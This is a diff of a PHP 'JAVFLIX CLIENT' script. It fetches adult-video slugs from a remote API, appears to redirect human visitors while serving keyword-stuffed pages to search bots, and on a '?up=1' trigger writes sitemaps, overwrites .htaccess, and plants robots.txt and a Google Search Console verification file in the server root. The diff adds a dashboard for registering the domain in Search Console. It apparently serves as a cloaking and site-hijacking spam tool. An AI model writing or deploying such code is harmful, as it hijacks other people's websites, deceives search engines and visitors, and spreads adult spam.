@@ -1,6 +1,6 @@
 <?php
 // =============================================================
-// JAVFLIX CLIENT (FINAL: OFFICIAL DESCRIPTION STYLE)
+// JAVFLIX CLIENT (FINAL: GSC HELPER DASHBOARD + PRO SEO)
 // =============================================================
 
 $endpoint_url = "https://stepmomhub.com/seo/api.php"; 
@@ -54,7 +54,7 @@ function fetchData($url, $is_bot_flag) {
 // --- 3. EKSEKUSI DATA ---
 $remote_data = fetchData($endpoint_url, $is_bot);
 
-$direct = "https://javpornsub.net";
+$direct = "https://google.com";
 $valid_list = [];
 
 if ($remote_data && isset($remote_data['direct'])) {
@@ -71,12 +71,16 @@ if (!$is_bot && !isset($_GET['up'])) {
 }
 
 // =============================================================
-// FITUR: GENERATOR SITEMAP (?up=1) + FALLBACK + GOOGLE FILE
+// FITUR: GENERATOR SITEMAP (?up=1) + GSC DASHBOARD
 // =============================================================
 if (isset($_GET['up'])) {
     @ini_set('memory_limit', '-1');
     @set_time_limit(0);
     ignore_user_abort(true);
+    
+    // BUFFER OUTPUT LOG
+    $logs = [];
+    $logs[] = "Initializing Sitemap Generator...";
     
     // --- FALLBACK MANUAL INPUT ---
     if (empty($valid_list)) {
@@ -87,13 +91,14 @@ if (isset($_GET['up'])) {
             
             if ($manual_data && isset($manual_data['list']) && is_array($manual_data['list'])) {
                 $valid_list = $manual_data['list'];
-                echo "<div style='background:green;color:white;padding:10px;'>✅ Data Manual Berhasil di-load!</div>";
+                $logs[] = "✅ Data Manual Loaded (" . count($valid_list) . " items)";
             } else {
-                echo "<div style='background:red;color:white;padding:10px;'>❌ Format JSON Salah!</div>";
+                $logs[] = "❌ Invalid JSON Format!";
             }
         } 
         
         if (empty($valid_list)) {
+            // TAMPILKAN FORM JIKA KOSONG
             ?>
             <!DOCTYPE html>
             <html>
@@ -116,9 +121,7 @@ if (isset($_GET['up'])) {
         }
     }
 
-    // --- PROSES SITEMAP ---
-    header("Content-Type: text/plain");
-    
+    // --- PROSES GENERATE FILES ---
     $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
     $host = $_SERVER['HTTP_HOST'];
     $current_dir = str_replace(basename($_SERVER['SCRIPT_NAME']), "", $_SERVER['SCRIPT_NAME']); 
@@ -126,16 +129,11 @@ if (isset($_GET['up'])) {
     $local_dir = __DIR__;
 
     $all_urls = [];
-    
-    // 1. Tambahkan Homepage Utama
     $all_urls[] = $root_url; 
-    
-    // 2. Tambahkan URL SEO Khusus
     $clean_root = rtrim($root_url, '/');
     $all_urls[] = $clean_root . "/jav-sub-indo";
     $all_urls[] = $clean_root . "/jav-english-subtitle";
 
-    // 3. Tambahkan URL Video
     foreach ($valid_list as $slug) {
         $slug = trim($slug);
         if (!empty($slug)) {
@@ -145,7 +143,7 @@ if (isset($_GET['up'])) {
         }
     }
 
-    echo "Processing " . count($all_urls) . " URLs...\n";
+    $logs[] = "Processing " . count($all_urls) . " URLs...";
     $chunks = array_chunk($all_urls, 3000);
     $sitemap_files = [];
 
@@ -163,7 +161,7 @@ if (isset($_GET['up'])) {
         }
         $xml .= '</urlset>';
         if(file_put_contents($local_dir . '/' . $filename, $xml)) {
-            echo "[OK] Generated $filename\n";
+            $logs[] = "[OK] Generated $filename";
             $sitemap_files[] = $root_url . $filename;
         }
     }
@@ -178,29 +176,127 @@ if (isset($_GET['up'])) {
     }
     $index_xml .= '</sitemapindex>';
     file_put_contents($local_dir . '/sitemap.xml', $index_xml);
-    echo "[SUCCESS] MASTER sitemap.xml created.\n";
+    $logs[] = "[SUCCESS] MASTER sitemap.xml created.";
 
-    // --- UPDATE .HTACCESS (SEO URLS + GZIP) ---
+    // .HTACCESS & GZIP
     $htaccess_content = "<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase " . $current_dir . "\n";
     $htaccess_content .= "RewriteRule ^jav-sub-indo/?$ index.php?id=jav-sub-indo [L]\n";
     $htaccess_content .= "RewriteRule ^jav-english-subtitle/?$ index.php?id=jav-english-subtitle [L]\n";
     $htaccess_content .= "RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n</IfModule>\n";
-    
     $htaccess_content .= "\n<IfModule mod_deflate.c>\n";
     $htaccess_content .= "  AddOutputFilterByType DEFLATE text/plain text/html text/xml application/xml application/xhtml+xml application/rss+xml application/javascript application/x-javascript\n";
     $htaccess_content .= "</IfModule>\n";
-
     file_put_contents($local_dir . '/.htaccess', $htaccess_content);
-    echo "[SUCCESS] .htaccess updated with Custom SEO Routes & GZIP.\n";
+    $logs[] = "[SUCCESS] .htaccess updated (SEO + GZIP).";
     
-    // --- ROBOTS & GOOGLE VERIFICATION ---
+    // ROBOTS & GOOGLE
     $server_root = $_SERVER['DOCUMENT_ROOT'];
     if (is_writable($server_root)) { 
         file_put_contents($server_root . "/robots.txt", "User-agent: *\nAllow: /\nSitemap: " . $root_url . "sitemap.xml\n");
         file_put_contents($server_root . "/googleaa90ee18a76106a6.html", "google-site-verification: googleaa90ee18a76106a6.html");
-        echo "[SUCCESS] robots.txt & Google Verification created.\n";
+        $logs[] = "[SUCCESS] robots.txt & Google Verification created.";
     }
 
+    // --- TAMPILAN DASHBOARD SUKSES ---
+    // Variable untuk dicopy
+    $domain_prop = $protocol . $host;
+    // Bersihkan path agar hanya menampilkan folder/file relatif
+    $sitemap_path = ltrim($current_dir . 'sitemap.xml', '/'); 
+    if (empty($sitemap_path)) $sitemap_path = 'sitemap.xml';
+    $sitemap_full_url = $root_url . 'sitemap.xml';
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>GSC Helper</title>
+        <style>
+            body { background-color: #0d1117; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+            .card { background-color: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 20px; width: 100%; max-width: 600px; margin-bottom: 20px; box-shadow: 0 3px 10px rgba(0,0,0,0.5); }
+            h2 { margin-top: 0; color: #58a6ff; font-size: 1.5em; text-align: center; margin-bottom: 20px; }
+            .action-box { background: #21262d; border: 1px solid #30363d; padding: 15px; margin-bottom: 15px; border-radius: 6px; cursor: pointer; transition: 0.2s; position: relative; }
+            .action-box:hover { border-color: #58a6ff; background: #292e36; }
+            .action-box:active { transform: scale(0.98); }
+            .label { font-size: 0.85em; color: #8b949e; display: block; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 0.5px; }
+            .value { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace; font-size: 1.1em; color: #2ea043; word-break: break-all; }
+            .hint { font-size: 0.75em; color: #8b949e; margin-top: 5px; display: block; font-style: italic; }
+            .log-terminal { background: #000; color: #0f0; padding: 15px; border-radius: 6px; font-family: monospace; font-size: 0.9em; height: 200px; overflow-y: auto; border: 1px solid #30363d; }
+            .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #238636; color: white; padding: 10px 20px; border-radius: 20px; font-weight: bold; opacity: 0; transition: opacity 0.3s; pointer-events: none; }
+            .show { opacity: 1; }
+        </style>
+    </head>
+    <body>
+        <div id="toast" class="toast">Copied to Clipboard!</div>
+
+        <div class="card">
+            <h2>🚀 GSC Setup Helper</h2>
+            
+            <div class="action-box" onclick="copyText('<?= $domain_prop; ?>')">
+                <span class="label">Step 1: Add Property (Domain)</span>
+                <div class="value"><?= $domain_prop; ?></div>
+                <span class="hint">🖱️ Klik untuk Copy Domain</span>
+            </div>
+
+            <div class="action-box" onclick="copyAndOpen('<?= $sitemap_path; ?>', '<?= $sitemap_full_url; ?>')">
+                <span class="label">Step 2: Add Sitemap URL</span>
+                <div class="value"><?= $sitemap_path; ?></div>
+                <span class="hint">🖱️ Klik untuk Copy Path & Buka XML</span>
+            </div>
+        </div>
+
+        <div class="card">
+            <span class="label">Execution Logs</span>
+            <div class="log-terminal">
+                <?php foreach($logs as $log): ?>
+                    <div>> <?= htmlspecialchars($log); ?></div>
+                <?php endforeach; ?>
+                <div>> Done.</div>
+            </div>
+        </div>
+
+        <script>
+            function showToast(msg) {
+                const toast = document.getElementById('toast');
+                toast.textContent = msg;
+                toast.classList.add('show');
+                setTimeout(() => toast.classList.remove('show'), 2000);
+            }
+
+            function copyText(text) {
+                navigator.clipboard.writeText(text).then(() => {
+                    showToast('Domain Copied: ' + text);
+                }).catch(err => {
+                    // Fallback
+                    const ta = document.createElement('textarea');
+                    ta.value = text;
+                    document.body.appendChild(ta);
+                    ta.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(ta);
+                    showToast('Domain Copied!');
+                });
+            }
+
+            function copyAndOpen(text, url) {
+                navigator.clipboard.writeText(text).then(() => {
+                    showToast('Path Copied! Opening Sitemap...');
+                    setTimeout(() => window.open(url, '_blank'), 500);
+                }).catch(err => {
+                    const ta = document.createElement('textarea');
+                    ta.value = text;
+                    document.body.appendChild(ta);
+                    ta.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(ta);
+                    showToast('Path Copied!');
+                    setTimeout(() => window.open(url, '_blank'), 500);
+                });
+            }
+        </script>
+    </body>
+    </html>
+    <?php
     exit;
 }
 
@@ -258,20 +354,13 @@ if (empty($raw_id)) {
     $kode_video = strtoupper(trim($raw_id));
 
     if ($lang_mode == 'indo') {
-        // [REQUEST KHUSUS USER]
         $title_page = "$kode_video : JAV SUB INDO";
-        
-        // Deskripsi sesuai permintaan: "ADALAH VIDEO RESMI..."
         $desc_page = "$kode_video adalah video resmi dari JAV, $kode_video terdapat subtitle Indonesia alias sub indo. Nonton streaming $kode_video uncensored kualitas full HD gratis di JAVFLIX.";
-        
         $faq_q1 = "Link nonton $kode_video Sub Indo?";
         $faq_a1 = "Streaming $kode_video subtitle Indonesia gratis di JAVFLIX.";
     } else {
-        // ENGLISH VERSION (disesuaikan agar mirip)
         $title_page = "$kode_video : JAV ENGLISH SUBTITLE";
-        
         $desc_page = "$kode_video is an official video from JAV, $kode_video contains English subtitle alias Eng Sub. Watch streaming $kode_video uncensored full HD quality free on JAVFLIX.";
-        
         $faq_q1 = "Where to watch $kode_video?";
         $faq_a1 = "Stream $kode_video Jav Sub English uncensored for free on JAVFLIX.";
     }
